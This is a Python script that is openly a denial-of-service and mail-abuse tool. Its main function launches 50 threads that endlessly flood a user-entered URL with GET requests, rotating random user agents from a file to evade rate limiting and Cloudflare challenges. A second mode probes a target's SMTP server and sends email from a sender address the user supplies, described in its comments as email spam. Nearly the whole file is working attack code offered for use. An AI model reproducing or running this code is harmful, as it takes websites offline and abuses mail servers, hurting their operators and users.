
import requests
import smtplib
from smtplib import SMTP # Email
from email.message import EmailMessage # email spam

import random
import threading
import sys

from ascii import snake

# Variable for how many connections have been made
CONNECTED = 0

# Generates a random UA from a list of 10000 UAs
def generate_new_ua():
    with open("ua.txt", 'r') as f:
        data = f.readlines()
    return random.choice(data)

# Send http/https requests
def sendhttp():
    while 1:
        try:
            # Globals
            global CONNECTED
            global url

            # HTTP Header
            h = {
                "User-Agent": f"{generate_new_ua()}"
            }

            # Default GET
            r = requests.get(url, headers=h)

            # Line breaks
            print('\n\n')

            # DETECT IF IT WENT THROUGH
            if r.status_code == 200:
                CONNECTED += 1
                # Print how many devices successfully connected
                print(f"                  ~>{CONNECTED}")
            elif r.status_code == 404:
                print("                  ~> We getting 404, sites down.")
            elif r.status_code == 429:
                print("                  ~> We're being rate limited.")
            elif r.status_code == 403:
                print("                  ~> Got a 403 back, we're getting challenged by cloudflare.")

        # Exceptions
        except KeyboardInterrupt:
            print("                  ~> Bye bitch !!!")
            sys.exit()







def smtpsend():
    try:
        print("\n\n")
        with SMTP(url, port, timeout=10) as smtp:
            response = smtp.noop()
        if response[0] == 250:
            print("                  ~> Server has SMTP here.\n\n\n")

            sender_email = input("                  ~> Sender: ")
            recipient_email = input("                  ~> Recipient: ")

            # Create the Email
            msg = EmailMessage()
            msg.set_content("This is a test email sent via Python.")

            msg['Subject'] = "Test Email from Python"
            msg['From'] = sender_email
            msg['To'] = recipient_email

            try:
                with smtplib.SMTP(url, port, timeout=10) as server:
                    server.send_message(msg)
                    print("                  ~> Email sent successfully.")
            except Exception as e:
                print(f"                  ~> Failed to send email. Error: {e}")


        else:
            print(f"                  ~> No SMTP at Port: {port}")
    except KeyboardInterrupt:
        print("                  ~> Bye bitch !!!")
    except TimeoutError:
        print("                  ~> Timedout (Ports not open)")















# Creates the Threading and Runs the script to DDoS a HTTP/HTTPS Server
def website_attack():

    # Global
    global url

    # UI
    url = input("                  ~> Input url: ")

    # CPU Threading
    threads = []

    for x in range(50):
        t = threading.Thread(target=sendhttp)
        t.daemon = True
        threads.append(t)

    for x in range(50):
        threads[x].start()

    for x in range(50):
        threads[x].join()

    print(f"\n\n\nThreads:\n\n{threads}\n\n")

def mail_attack():
    global url
    global port
    url = input(">>> ")
    port = input(">>> ")
    smtpsend()

# UI
print(f"\n\n{snake}\n\n")
ui = input("                  ~> ")

if ui in ['website', '80', '8000', '8080', 'Website', 'Website']:
    website_attack()
elif ui in ['mail', 'smtp', 'mailserver']:
    mail_attack()
